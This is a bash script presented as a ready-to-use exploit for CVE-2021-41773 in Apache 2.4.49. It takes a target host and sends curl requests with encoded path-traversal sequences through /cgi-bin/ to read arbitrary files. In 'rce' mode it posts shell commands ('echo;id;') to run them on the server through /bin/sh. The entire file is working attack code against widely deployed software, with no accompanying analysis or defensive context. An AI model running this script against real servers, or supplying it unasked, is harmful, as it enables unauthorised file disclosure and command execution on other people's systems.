#!/bin/bash

# RCE + Path Traversal exploit
# Author: FN 
# CVE-2021-41773
# Apache 2.4.49
# 



if [[ $# -eq 0 ]];
then
    echo "USAGE: ./exploit.sh [TARGET] [PATH or /bin/sh for RCE] [RCE]"
fi

if [[ $(curl -m 3 -i -s -k -X GET ''$1'/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/'$2'' | grep HTTP | awk '{print $2}') != "200" ]];
then
	echo "$1 Not vuln!"
	exit 1
fi

if [[ $3 == "rce" ]];
then
	echo -e "Try RCE on $1 - $(host $1) - OUTPUT:"
	curl -m 3 -s -k --data "echo;id;" ''$1'/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/'$2''
	exit 1
fi

echo -e "$1 - $(host $1) - OUTPUT: "
curl -m 3 -s -k -X GET ''$1'/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/'$2''
